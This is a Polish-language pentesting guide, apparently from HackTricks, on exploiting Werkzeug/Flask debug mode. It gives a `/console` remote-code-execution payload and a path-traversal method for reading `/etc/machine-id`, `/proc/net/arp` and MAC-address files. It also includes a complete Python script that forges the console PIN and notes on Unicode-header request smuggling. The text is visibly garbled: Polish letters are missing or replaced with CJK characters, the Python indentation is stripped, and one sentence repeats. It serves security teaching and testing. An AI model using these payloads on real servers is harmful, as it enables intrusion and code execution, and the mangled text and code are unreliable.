# Werkzeug / Flask Debug

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Natychmiastowo dostpna konfiguracja do oceny podatnoci i test贸w penetracyjnych**. Przeprowad藕 peny pentest z dowolnego miejsca z 20+ narzdziami i funkcjami, kt贸re obejmuj od rekonesansu po raportowanie. Nie zastpujemy pentester贸w - rozwijamy niestandardowe narzdzia, moduy wykrywania i eksploatacji, aby da im z powrotem troch czasu na gbsze badania, przeamywanie zabezpiecze i zabaw.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Console RCE

Jeli debugowanie jest aktywne, mo偶esz spr贸bowa uzyska dostp do `/console` i zdoby RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

Istnieje r贸wnie偶 kilka exploit贸w w internecie, takich jak [ten](https://github.com/its-arun/Werkzeug-Debug-RCE) lub jeden w metasploit.

## Pin Protected - Path Traversal

W niekt贸rych przypadkach punkt kocowy **`/console`** bdzie chroniony pinem. Jeli masz **vulnerability** do przechodzenia przez pliki, mo偶esz wyciekowa wszystkie niezbdne informacje do wygenerowania tego pinu.

### Werkzeug Console PIN Exploit

Wymu stron bdu debugowania w aplikacji, aby zobaczy to:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
W przypadku pr贸by uzyskania dostpu do interfejsu debugowania Werkzeug pojawia si komunikat dotyczcy scenariusza "console locked", wskazujcy na konieczno podania PIN-u w celu odblokowania konsoli. Sugeruje si wykorzystanie PIN-u konsoli poprzez analiz algorytmu generowania PIN-贸w w pliku inicjalizacyjnym debugowania Werkzeug (`__init__.py`). Mechanizm generowania PIN-贸w mo偶na zbada w [**repozytorium kodu 藕r贸dowego Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), chocia偶 zaleca si pozyskanie rzeczywistego kodu serwera za pomoc luki w przejciu plik贸w z powodu potencjalnych rozbie偶noci wersji.

Aby wykorzysta PIN konsoli, potrzebne s dwa zestawy zmiennych: `probably_public_bits` i `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Odnosi si do u偶ytkownika, kt贸ry zainicjowa sesj Flask.
* **`modname`**: Zazwyczaj oznaczany jako `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Zwykle rozwizuje si do **Flask**.
* **`getattr(mod, '__file__', None)`**: Reprezentuje pen cie偶k do `app.py` w katalogu Flask (np. `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Jeli `app.py` nie jest odpowiedni, **spr贸buj `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Pobiera adres MAC bie偶cej maszyny, a `str(uuid.getnode())` przeksztaca go w format dziesitny.
* Aby **okreli adres MAC serwera**, nale偶y zidentyfikowa aktywny interfejs sieciowy u偶ywany przez aplikacj (np. `ens3`). W przypadku niepewnoci, **wycieknij `/proc/net/arp`**, aby znale藕 identyfikator urzdzenia, a nastpnie **wyodrbnij adres MAC** z **`/sys/class/net/<device id>/address`**.
*   Konwersj adresu MAC w formacie szesnastkowym na dziesitny mo偶na wykona, jak pokazano poni偶ej:

```python
# Przykadowy adres MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: czy dane z `/etc/machine-id` lub `/proc/sys/kernel/random/boot_id` z pierwsz lini `/proc/self/cgroup` po ostatnim ukoniku (`/`).

<details>

<summary>Code for `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Po zebraniu wszystkich niezbdnych danych, skrypt exploitacyjny mo偶e zosta uruchomiony w celu wygenerowania PIN-u konsoli Werkzeug:

Po zebraniu wszystkich niezbdnych danych, skrypt exploitacyjny mo偶e zosta uruchomiony w celu wygenerowania PIN-u konsoli Werkzeug. Skrypt wykorzystuje zebrane `probably_public_bits` i `private_bits` do stworzenia hasha, kt贸ry nastpnie przechodzi dalsze przetwarzanie w celu uzyskania ostatecznego PIN-u. Poni偶ej znajduje si kod Pythona do wykonania tego procesu:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Ten skrypt generuje PIN, haszujc poczone bity, dodajc konkretne sole (`cookiesalt` i `pinsalt`) oraz formatujc wynik. Wa偶ne jest, aby rzeczywiste wartoci dla `probably_public_bits` i `private_bits` byy dokadnie uzyskane z systemu docelowego, aby zapewni, 偶e wygenerowany PIN odpowiada temu, kt贸ry oczekuje konsola Werkzeug.

{% hint style="success" %}
Jeli u偶ywasz **starej wersji** Werkzeug, spr贸buj zmieni **algorytm haszowania na md5** zamiast sha1.
{% endhint %}

## Znaki Unicode w Werkzeug

Jak zaobserwowano w [**tym zgoszeniu**](https://github.com/pallets/werkzeug/issues/2833), Werkzeug nie zamyka 偶dania z znakami Unicode w nag贸wkach. Jak wyjaniono w [**tym opracowaniu**](https://mizu.re/post/twisty-python), mo偶e to spowodowa podatno na CL.0 Request Smuggling.

Dzieje si tak, poniewa偶 w Werkzeug mo偶liwe jest wysyanie niekt贸rych **znak贸w Unicode**, co spowoduje **awari** serwera. Jednak jeli poczenie HTTP zostao utworzone z nag贸wkiem **`Connection: keep-alive`**, ciao 偶dania nie zostanie odczytane, a poczenie pozostanie otwarte, wic **ciao** 偶dania bdzie traktowane jako **nastpne 偶danie HTTP**.

## Zautomatyzowane Wykorzystanie

{% embed url="https://github.com/Ruulian/wconsole_extractor" %}

## Odniesienia

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Natychmiast dostpne ustawienie do oceny podatnoci i test贸w penetracyjnych**. Przeprowad藕 peny pentest z dowolnego miejsca z ponad 20 narzdziami i funkcjami, kt贸re obejmuj od rekonesansu po raportowanie. Nie zastpujemy pentester贸w - rozwijamy niestandardowe narzdzia, moduy wykrywania i wykorzystania, aby da im z powrotem troch czasu na gbsze badania, przeamywanie zabezpiecze i zabaw.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>
{% endhint %}
